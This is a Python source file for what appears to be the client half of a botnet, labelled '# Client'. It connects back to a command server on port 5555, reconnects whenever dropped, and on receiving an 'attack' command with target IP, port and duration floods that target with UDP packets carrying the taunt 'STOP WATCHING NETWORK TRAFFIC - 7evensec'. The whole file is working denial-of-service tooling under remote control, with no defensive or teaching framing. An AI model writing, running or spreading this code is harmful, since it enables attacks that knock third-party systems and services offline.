# Client
import os
import time
import socket
from colorama import Fore, Style

# Server configuration
HOST = '127.0.0.1'
PORT = 5555

def send_udp_packets(target_ip, target_port, data, duration):
    start_time = time.time()

    while time.time() - start_time < duration:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
                udp_socket.sendto(data, (target_ip, target_port))
            print(f"Flooding {target_ip}:{target_port}.")
        except Exception as e:
            print(f"Error sending UDP packet: {e}")

def connect_to_server():
    # Create a socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    connected = False

    while not connected:
        try:
            # Try to connect to the server
            client_socket.connect((HOST, PORT))
            connected = True
            print(f"{Fore.GREEN}Connected{Style.RESET_ALL}")  # Print connected message in green
        except Exception as e:
            time.sleep(1)

    return client_socket

def main():
    while True:
        client_socket = connect_to_server()

        try:
            # Receive and print messages from the server
            while True:
                data = client_socket.recv(1024).decode('utf-8')
                if data.startswith("attack"):
                    # Split the string by space and get the arguments after "attack"
                    arguments = data.split()[1:]
                    ip = arguments[0]
                    port = int(arguments[1])  
                    sec = int(arguments[2]) 
                    udp_data = b"STOP WATCHING NETWORK TRAFFIC - 7evensec"
                    send_udp_packets(ip, port, udp_data, sec)
                    # Send a message to the server indicating that the flood has stopped
                    client_socket.send("Flood stopped".encode('utf-8'))

        except Exception as e:
            print(f"{Fore.RED}Connection dropped. Retrying...{Style.RESET_ALL}")
        finally:
            # Close the socket before attempting to reconnect
            client_socket.close()

if __name__ == "__main__":
    main()
